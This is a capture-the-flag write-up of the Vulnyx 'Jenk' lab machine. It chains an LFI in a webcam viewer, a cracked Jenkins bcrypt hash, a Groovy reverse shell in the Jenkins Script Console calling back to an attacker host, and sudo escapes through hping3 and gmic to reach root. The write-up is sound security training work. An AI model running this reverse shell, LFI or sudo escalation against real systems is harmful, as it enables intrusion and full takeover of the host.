# Vulnyx: Jenk

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Medium |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `john` · `nc` |
| **Tags** | `#LFI` `#Jenkins` `#HashCracking` `#RCE` `#SudoAbuse` `#GTFOBins` |
| **URL** | https://vulnyx.com/machines/ |

A webcam viewer's `cam` parameter turns out to be a Local File Inclusion vulnerability, used to reach straight into Jenkins's own internal user store — leaking a user list and, from a specific user's config, a bcrypt password hash that cracks with `rockyou.txt`. Those credentials get into Jenkins itself, whose Script Console gives arbitrary code execution as the `jenkins` service account. A `sudo` rule around `hping3` pivots to `andrew`'s shell, and a second `sudo` rule around `gmic` — an image-processing tool with a documented command-execution flag — reaches root.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn jenk.nyx

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 08:00:27:76:E7:C3 (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **8080** — Jenkins's default port. A version/script scan against all three fills in the details:

```bash
$ sudo nmap -p 22,80,8080 -sCV jenk.nyx

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
8080/tcp open  http    Jetty 10.0.13
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(10.0.13)
| http-robots.txt: 1 disallowed entry
|_/
MAC Address: 08:00:27:76:E7:C3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://jenk.nyx
http://jenk.nyx:8080
```

<img src="../Images/jenk/Pasted image 20260814164230.png"/>

<img src="../Images/jenk/Pasted image 20260814165324.png"/>

A content scan on port 80 turns up a `webcams` directory:

```bash
$ ffuf -u http://jenk.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html             [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 151ms]
.html                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 189ms]
.php                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 329ms]
webcams                [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 3ms]
.php                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 11ms]
.html                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 11ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 2ms]
```

Port 8080 is a Jenkins instance — the scan confirms the usual Jenkins routes, including the `login` page and `cli`:

```bash
$ ffuf -u http://jenk.nyx:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic -fw 306

login                  [Status: 200, Size: 1579, Words: 86, Lines: 6, Duration: 2295ms]
assets                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 617ms]
logout                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 424ms]
robots.txt             [Status: 200, Size: 71, Words: 11, Lines: 3, Duration: 117ms]
git                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 331ms]
oops                   [Status: 200, Size: 6980, Words: 294, Lines: 7, Duration: 2746ms]
cli                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 239ms]
```

## Initial Access

### LFI Discovery in the Webcam Viewer

The webcam viewer on the main site takes a `cam` parameter. Its normal behavior is checked first across a few legitimate values:

```
http://jenk.nyx/webcams/
http://jenk.nyx/webcams/includecam.php?cam=cam1
http://jenk.nyx/webcams/includecam.php?cam=cam2
http://jenk.nyx/webcams/includecam.php?cam=cam3
http://jenk.nyx/webcams/includecam.php?cam=cam4
http://jenk.nyx/webcams/includecam.php?cam=cam5
```

<img src="../Images/jenk/Pasted image 20260814164532.png"/>
<img src="../Images/jenk/Pasted image 20260814164719.png"/>

Appending `.xml` shows the parameter is used to build a file path directly, hinting at path traversal:

```
http://jenk.nyx/webcams/includecam.php?cam=cam1.xml
```

<img src="../Images/jenk/Pasted image 20260814164816.png"/>

### Loot: Jenkins Credentials via LFI

With the parameter confirmed to take an arbitrary path, it's pointed directly at Jenkins's own internal user store:

```
http://jenk.nyx/webcams/includecam.php?cam=/var/lib/jenkins/users/users
view-source:http://jenk.nyx/webcams/includecam.php?cam=/var/lib/jenkins/users/users
```

<img src="../Images/jenk/Pasted image 20260814164834.png"/>

<img src="../Images/jenk/Pasted image 20260814164948.png"/>

That leaks a specific user's storage path (`andrew`'s, with its randomized suffix), whose `config` file is checked next:

```
view-source:http://jenk.nyx/webcams/includecam.php?cam=/var/lib/jenkins/users/andrew_15328478385288074167/config
```

<img src="../Images/jenk/Pasted image 20260814165023.png"/>

> **Password hash:** `jbcrypt:$2a$10$V.wxGyfowdGEVLvpQt5DROedmKKUp11g922/V.tb1xmi8eYe7rmzu`

The bcrypt hash cracks against `rockyou.txt`:

```bash
$ john hash_jenkins --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
andrew1          (jbcrypt)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Credentials:** `andrew:andrew1`

### RCE via the Jenkins Script Console

The recovered credentials log into Jenkins:

<img src="../Images/jenk/Pasted image 20260814165357.png"/>

Jenkins's Script Console (at `/script`) runs arbitrary Groovy code in the context of the `jenkins` service account — a direct RCE surface for any authenticated user who can reach it. A Groovy reverse shell is pasted in:

<img src="../Images/jenk/Pasted image 20260823184713.png"/>

```groovy
String host="<ATTACKER_IP>";
int port=<PORT>;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [jenk.nyx] 56440
id
uid=106(jenkins) gid=112(jenkins) grupos=112(jenkins)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Escalating to andrew via hping3

```bash
jenkins@jenk:~$ sudo -l
Matching Defaults entries for jenkins on jenk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jenkins may run the following commands on jenk:
    (andrew) NOPASSWD: /usr/sbin/hping3
```

The current user can run `hping3` as `andrew`. Like several other interactive tools in this set, it has its own prompt once launched, and running a shell from inside it is a documented GTFOBins technique:

```bash
jenkins@jenk:~$ sudo -u andrew /usr/sbin/hping3
hping3> /bin/sh
$ id
uid=1000(andrew) gid=1000(andrew) grupos=1000(andrew)
andrew@jenk:/var/lib/jenkins$ ls -l /home/andrew
total 4
-r--------    1 andrew   andrew          33 jul 21  2023 user.txt
andrew@jenk:/var/lib/jenkins$ cat /home/andrew/user.txt
0210bf1feef973181bfff9a28e845f71
```

> **User flag:** `0210bf1feef973181bfff9a28e845f71`

## Privilege Escalation

### `gmic -exec`

```bash
andrew@jenk:/var/lib/jenkins$ sudo -l
Matching Defaults entries for andrew on jenk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User andrew may run the following commands on jenk:
    (root) NOPASSWD: /usr/bin/gmic
```

`andrew` can run `gmic` — G'MIC, an image-processing framework — as root. It has an `-exec` option that runs an arbitrary shell command directly, a documented GTFOBins technique:

```bash
andrew@jenk:/var/lib/jenkins$ sudo /usr/bin/gmic -exec id
[gmic]-0./ Start G'MIC interpreter.
[gmic]-0./ Execute external command 'id' in verbose mode.
uid=0(root) gid=0(root) grupos=0(root)

[gmic]-0./ End G'MIC interpreter.
andrew@jenk:/var/lib/jenkins$ sudo /usr/bin/gmic -exec bash
[gmic]-0./ Start G'MIC interpreter.
[gmic]-0./ Execute external command 'bash' in verbose mode.
root@jenk:/var/lib/jenkins# id
uid=0(root) gid=0(root) grupos=0(root)
root@jenk:/var/lib/jenkins# ls -l /root
total 8
drwxr-xr-x    2 root     root          4096 jul 21  2023 gmic
-r--------    1 root     root            33 jul 21  2023 root.txt
root@jenk:/var/lib/jenkins# cat /root/root.txt
d02c2cc0136e5c3bcba433098f746e42
```

> **Root flag:** `d02c2cc0136e5c3bcba433098f746e42`

## Takeaways

- An LFI is only as limited as the file permissions of the process serving it — pointed at the right internal path, it reached straight into Jenkins's own user database, well outside anything the webcam viewer was meant to expose.
- Jenkins's Script Console is one of the most direct RCE surfaces in any CI/CD tool — any valid login with access to it is functionally equivalent to code execution on the underlying host.
- Checking `sudo -l` again after a lateral move (not just after the initial foothold) matters — `andrew`'s own rules were only visible after actually becoming that user, and led straight to root.